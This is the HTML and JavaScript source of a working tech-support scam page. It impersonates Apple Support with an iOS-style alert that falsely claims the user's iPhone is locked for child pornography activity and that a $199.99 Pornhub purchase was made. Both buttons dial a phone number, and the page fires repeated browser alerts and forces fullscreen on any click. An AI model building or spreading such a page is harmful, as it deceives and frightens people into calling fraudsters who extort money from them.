<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Support Contact</title>

<style>
    body {
        margin: 0;
        padding: 0;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;

        /* Generic premium background */
        background: url('https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Apple_logo_black.svg/250px-Apple_logo_black.svg.png')
                    no-repeat center center;
        background-size: cover;

        height: 100vh;
        width: 100vw;
        display: flex;
        justify-content: center;
        align-items: center;
        position: relative;
        overflow: hidden;
    }

    /* Slight dim overlay for readability */
    .bg-overlay {
        position: fixed;
        inset: 0;
        background: rgba(0,0,0,0.45);
        z-index: 1;
    }

    .overlay {
        position: fixed;
        inset: 0;
        background: rgba(0, 0, 0, 0.25);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 10;
    }

    .ios-alert {
        width: 82%;
        max-width: 320px;
        background: #ffffff;
        border-radius: 14px;
        box-shadow: 0px 22px 45px rgba(0,0,0,0.45);
        text-align: center;
        padding-top: 18px;
        transform: scale(1.12);
        opacity: 0;
        animation: iosPop 0.25s cubic-bezier(.25,.8,.25,1) forwards;
        cursor: pointer;
        z-index: 11;
    }

    @keyframes iosPop {
        0% { transform: scale(1.12); opacity: 0; }
        100% { transform: scale(1); opacity: 1; }
    }

    .alert-title {
        font-size: 18px;
        font-weight: 600;
        color: #111;
        margin-bottom: 8px;
        padding: 0 18px;
    }

    .alert-message {
        font-size: 14px;
        color: #3b3b3b;
        padding: 0 20px 20px 20px;
        line-height: 1.45;
    }

    .buttons {
        border-top: 1px solid #d0d0d0;
        display: flex;
        height: 44px;
    }

    .buttons a {
        flex: 1;
        text-decoration: none;
        font-size: 17px;
        color: #007aff;
        display: flex;
        justify-content: center;
        align-items: center;
    }

    .buttons a:nth-child(1) {
        border-right: 1px solid #d0d0d0;
    }

    /* Connecting Screen */
    #connectingScreen {
        position: fixed;
        inset: 0;
        background: rgba(0,0,0,0.85);
        color: #fff;
        display: none;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        text-align: center;
        z-index: 9999;
        font-size: 22px;
        padding: 20px;
    }

    .spinner {
        width: 45px;
        height: 45px;
        border: 4px solid #555;
        border-top: 4px solid #fff;
        border-radius: 50%;
        animation: spin 1s linear infinite;
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
</style>
</head>

<body>

<!-- Background dim overlay -->
<div class="bg-overlay"></div>

<div class="overlay" id="overlay">
    <div class="ios-alert" id="alertBox">
        <div class="alert-title">Apple Support</div>
        <div class="alert-message">Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it..</div>

        <div class="buttons">
            <a href="tel:+18082774439">Cancel</a>
            <a href="tel:+18082774439">Call Now</a>
        </div>
    </div>
</div>

<div id="connectingScreen">
    <div class="spinner"></div>
    <p style="margin-top:20px;">Connecting youâ€¦</p>
</div>

<script>

    alert("Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it..");

        alert("Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it..");

<!-- Fullscreen -->
<script>
function goFullscreen() {
    let e = document.documentElement;
    if (e.requestFullscreen) e.requestFullscreen();
    else if (e.webkitRequestFullscreen) e.webkitRequestFullscreen();
}
document.addEventListener("click", goFullscreen);
document.getElementById("alertBox").addEventListener("click", function(e){

    goFullscreen();
});
</script>
